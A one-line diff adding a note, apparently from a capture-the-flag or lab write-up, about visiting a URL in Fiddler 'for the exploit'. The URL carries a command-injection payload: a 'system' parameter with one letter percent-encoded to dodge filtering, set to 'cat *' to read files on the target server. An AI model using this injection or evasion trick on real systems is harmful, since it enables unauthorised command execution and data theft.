@@ -1,0 +1,1 @@
+I visited http://35.196.45.11:8080/?syst%65m=cat+* in Fiddler for the exploit.
